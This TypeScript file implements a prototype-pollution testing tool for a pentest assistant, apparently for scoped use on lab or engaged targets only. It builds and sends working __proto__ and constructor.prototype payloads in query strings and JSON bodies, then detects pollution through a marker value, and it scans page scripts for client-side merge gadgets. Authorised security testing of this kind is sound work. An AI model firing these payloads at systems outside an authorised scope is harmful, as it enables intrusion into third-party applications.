// protoPollute.ts — prototype pollution prover (write/confirm tool
// `proto_pollute`). Two surfaces in one bounded pass:
//   • SERVER: __proto__/constructor.prototype payloads as query params and a
//     JSON body — pollution shows up as a NEW key appearing in a later
//     response body, or an error envelope proving the key reached a
//     merge/parse routine.
//   • CLIENT: source→gadget detection in the page's own JS — a
//     location.hash/search/postMessage/window.name source feeding
//     JSON.parse/merge/extend/Object.assign sinks, plus a scan of inline
//     script for merge-into-config gadgets. Static + bounded; dynamic
//     confirmation stays with the analyst (dom_xss_prove covers the DOM-XSS
//     case separately).
// Every function is scope-gated via targetAllowed, bounded, low-rate, honest:
// a signal is never claimed as a confirmed vulnerability. Pure helpers are
// exported for unit tests.
import { targetAllowed, politeDelay } from "./security";
import { recordHttp } from "./httpHistory";
import { sessionHeaders } from "./httpSession";

const UA = "mia-assistant/1.0";

type ProbeResult = { status: number; body: string; headers: Record<string, string>; ms: number; error?: string };

function lowerHeaders(h: Headers): Record<string, string> {
  const out: Record<string, string> = {};
  h.forEach((v, k) => { out[k.toLowerCase()] = v; });
  return out;
}

async function fetchProbe(url: string, opts: { method?: string; headers?: Record<string, string>; body?: string; session?: string; rawUser?: unknown } = {}): Promise<ProbeResult> {
  const method = (opts.method || "GET").toUpperCase();
  const headers: Record<string, string> = { "User-Agent": UA };
  if (opts.session && opts.rawUser) {
    const s = sessionHeaders(opts.rawUser, opts.session);
    if (s) {
      Object.assign(headers, s.headers);
      if (s.cookie && !Object.keys(headers).some((k) => k.toLowerCase() === "cookie")) headers.cookie = s.cookie;
    }
  }
  Object.assign(headers, opts.headers || {});
  const t0 = Date.now();
  try {
    const res = await fetch(url, { method, headers, body: method === "GET" || method === "HEAD" ? undefined : opts.body, redirect: "manual", signal: AbortSignal.timeout(12_000) });
    const body = (await res.text()).slice(0, 12_000);
    return { status: res.status, body, headers: lowerHeaders(res.headers), ms: Date.now() - t0 };
  } catch (e) {
    return { status: 0, body: "", headers: {}, ms: Date.now() - t0, error: e instanceof Error ? e.message : String(e) };
  }
}

// ── Pure helpers (unit-tested) ──────────────────────────────────────────────

export const MARK = "mia_polluted";

/** The classic server-side payload set (key name is the pollution marker). */
export const POLLUTE_KEYS = ["__proto__", "constructor", "constructor.prototype"] as const;

export type PPAttempt = { name: string; url: string; method: string; body?: string; headers?: Record<string, string> };

/** Build bounded server-side pollution attempts for one endpoint. Pure. */
export function buildServerPayloads(u: string, param: string): PPAttempt[] {
  try { new URL(u); } catch { return []; }
  const safeParam = param.replace(/^[^A-Za-z0-9_-]+|[^A-Za-z0-9_-]/g, "") || "profile";
  const out: PPAttempt[] = [];
  const withQuery = (pair: string): string => {
    const c = new URL(u);
    c.search = c.search ? c.search + "&" + pair : "?" + pair;
    return c.toString();
  };
  // Query-param variants (express qs / body-parser style sinks).
  out.push({ name: "query __proto__[k]=v", url: withQuery(`__proto__%5B${safeParam}%5D=${MARK}`), method: "GET" });
  out.push({ name: "query constructor[prototype][k]=v", url: withQuery(`constructor%5Bprototype%5D%5B${safeParam}%5D=${MARK}`), method: "GET" });
  out.push({ name: "query __proto__.k=v (dot)", url: withQuery(`__proto__.${safeParam}=${MARK}`), method: "GET" });
  // JSON body variants (deep-merge sinks). NOTE: built as wire-format string
  // literals — JSON.stringify({__proto__: …}) would DROP the key (an object
  // literal sets the prototype instead of creating an own property).
  out.push({ name: "JSON {__proto__:{k}}", url: u, method: "POST", body: `{"__proto__":{"${safeParam}":"${MARK}"}}`, headers: { "content-type": "application/json" } });
  out.push({ name: "JSON {constructor:{prototype:{k}}}", url: u, method: "POST", body: `{"constructor":{"prototype":{"${safeParam}":"${MARK}"}}}`, headers: { "content-type": "application/json" } });
  return out;
}

/**
 * Server-side classification of one probe against the baseline. Pure.
 * STRONG = the marker key materialized in a LATER response body; WEAK =
 * error envelope naming __proto__ (reached a parse/merge routine).
 */
export function classifyServer(base: ProbeResult, probe: ProbeResult, param: string): string[] {
  const out: string[] = [];
  if (probe.error || probe.status === 0) { out.push("gagal jaringan"); return out; }
  const probeOf = probe.body.toLowerCase();
  const baseOf = base.body.toLowerCase();
  if (probe.body.includes(MARK) && !base.body.includes(MARK)) {
    out.push(`✅ STRONG: marker "${MARK}" muncul di respons (${probe.status}) — key "${param}" ter-pollute ke output`);
    return out;
  }
  if (probeOf.includes("__proto__") && !baseOf.includes("__proto__")) {
    out.push(`⚠️ WEAK: error respons menyebut __proto__ (${probe.status}) — payload sampai ke parser/merge; kebocoran key perlu bukti lanjutan`);
    return out;
  }
  if (probe.status === 500 && base.status !== 500) out.push(`⚠️ WEAK: 500 baru saat payload pollution (${probe.body.slice(0, 120).replace(/\s+/g, " ")})`);
  if (!out.length) out.push(`tidak ada indikasi (${probe.status})`);
  return out;
}

/** Client-side source→gadget report line for one JS snippet. Pure. */
export function classifyClient(snippet: string): string[] {
  const out: string[] = [];
  const sources: [RegExp, string][] = [
    [/location\.hash|location\.search|location\.href|window\.name|event\.data|postMessage/i, "location/postMessage source"],
  ];
  const sinks: [RegExp, string][] = [
    [/JSON\.parse/i, "JSON.parse"],
    [/\b(merge|extend|deepMerge|defaultsDeep|set|assign)\s*\(/i, "merge/extend/assign sink"],
    [/Object\.assign\s*\(/i, "Object.assign"],
  ];
  const hasSource = sources.some(([re]) => re.test(snippet));
  const hitSinks = sinks.filter(([re]) => re.test(snippet)).map(([, n]) => n);
  if (hasSource && hitSinks.length) {
    out.push(`⚠️ CLIENT-LEAD: source (location/postMessage) + sink ${hitSinks.join(" / ")} di JS yang sama — uji gadget manual (hash berisi __proto__ pollution) sebelum finding_add (CWE-1321)`);
  } else if (hitSinks.length) {
    out.push(`sink ${hitSinks.join(" / ")} ada tapi tidak ada source terlihat — merge tanpa __proto__ guard tetap dicatat sebagai hardening note`);
  }
  return out;
}

// ── Runner ──────────────────────────────────────────────────────────────────

/**
 * Prototype-pollution prover. Server surface: fire the bounded payload set
 * against ONE endpoint, then re-fetch a "probe" endpoint to look for the
 * marker (cross-request pollution). Client surface: fetch the page + inline
 * scripts and look for source→gadget patterns. Bounded, low-rate, honest.
 */
export async function protoPollute(rawUser: unknown, opts: { url: string; param?: string; session?: string }): Promise<string> {
  const u = (opts.url || "").trim();
  if (!/^https?:\/\//i.test(u)) return "Error: URL harus http(s).";
  if (!targetAllowed(u)) return "Error: SCOPE — proto_pollute hanya untuk lab / engagement aktif / PENTEST_LAB_TARGETS.";
  const param = (opts.param || "polluted").replace(/[^A-Za-z0-9_-]/g, "") || "polluted";

  await politeDelay();
  const base = await fetchProbe(u, { session: opts.session, rawUser });
  recordHttp(rawUser, { method: "GET", url: u, status: base.status, bytes: base.body.length, ms: base.ms, at: new Date().toISOString() });

  // ── Server surface ──
  const attempts = buildServerPayloads(u, param).slice(0, 5);
  const serverHits: { name: string; signals: string[] }[] = [];
  let networkFail = 0;
  for (const a of attempts) {
    await politeDelay();
    const r = await fetchProbe(a.url, { method: a.method, body: a.body, headers: a.headers, session: opts.session, rawUser });
    recordHttp(rawUser, { method: a.method, url: a.url, status: r.status, bytes: r.body.length, ms: r.ms, at: new Date().toISOString() });
    const sig = classifyServer(base, r, param);
    if (sig[0] === "gagal jaringan") { networkFail++; continue; }
    if (!/tidak ada indikasi/.test(sig[0])) serverHits.push({ name: a.name, signals: sig });
  }
  // Cross-request check: pollution that persists would show the marker in a
  // clean re-fetch (no payload).
  let persistent = false;
  if (!serverHits.some((h) => h.signals.some((s) => s.includes("STRONG")))) {
    await politeDelay();
    const re = await fetchProbe(u, { session: opts.session, rawUser });
    if (!re.error && re.status !== 0 && re.body.includes(MARK) && !base.body.includes(MARK)) persistent = true;
  }

  // ── Client surface ──
  const clientLines: string[] = [];
  try {
    const page = new URL(u);
    const htmlProbe = await fetchProbe(page.origin + (page.pathname === "/" ? "/" : page.pathname), { session: opts.session, rawUser });
    const snippets = [htmlProbe.body, ...[...htmlProbe.body.matchAll(/<script[^>]*src="([^"]+)"[^>]*>/gi)].slice(0, 4).map((m) => {
      const src = m[1];
      try { return new URL(src, u).toString(); } catch { return ""; }
    })];
    for (const s of snippets.slice(1)) {
      if (!s) continue;
      if (!targetAllowed(s)) continue;
      await politeDelay();
      const js = await fetchProbe(s, { session: opts.session, rawUser });
      if (js.status === 0 || js.error) continue;
      // scan the whole bundle but report once
      const sig = classifyClient(js.body);
      if (sig.length) { clientLines.push(`${s.slice(0, 90)} → ${sig[0]}`); break; }
    }
    for (const sig of classifyClient(htmlProbe.body)) {
      if (sig.startsWith("⚠️")) clientLines.push(`inline HTML → ${sig}`);
    }
  } catch { /* client surface best-effort */ }

  const head = `🧬 PROTO POLLUTE ${u} (param kandidat "${param}") — ${attempts.length} payload server${networkFail ? `, ${networkFail} gagal jaringan` : ""}${clientLines.length ? `, ${clientLines.length} client-lead` : ""}.`;
  const parts: string[] = [head];
  if (serverHits.length) {
    parts.push(serverHits.map((h) => `• ${h.name}\n   ↳ ${h.signals.join("; ")}`).join("\n"));
  } else {
    parts.push("Server: tidak ada indikasi pollution dari payload set klasik (query + JSON).");
  }
  if (persistent) parts.push("🔥 PERSISTEN: marker masih ada di re-fetch BERSIH — pollution lintas-request (server-wide). Ini bukti kuat, langsung poc_verify.");
  if (clientLines.length) parts.push("Client:\n" + clientLines.map((l) => `• ${l}`).join("\n"));
  parts.push("\n⚠️ Sinyal ≠ exploit: pollution harus berdampak (gadget → XSS/privs/bypass). poc_verify + gadget manual sebelum finding_add (CWE-1321).");
  return parts.join("\n");
}
